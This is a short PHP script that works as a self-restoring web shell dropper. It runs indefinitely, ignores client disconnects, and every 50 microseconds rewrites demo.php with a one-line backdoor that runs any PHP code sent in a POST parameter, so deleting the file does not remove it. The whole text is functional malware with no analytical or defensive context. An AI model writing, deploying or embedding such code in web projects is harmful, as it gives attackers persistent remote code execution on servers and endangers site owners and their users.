<?php
ignore_user_abort(true);
set_time_limit(0);
$file = 'demo.php';
$shell = '<?php @eval($_POST[vf0k28]);?>';
 
while (TRUE) {
if (!file_exists($file)) {
file_put_contents($file, $shell);
}
usleep(50);
}
?>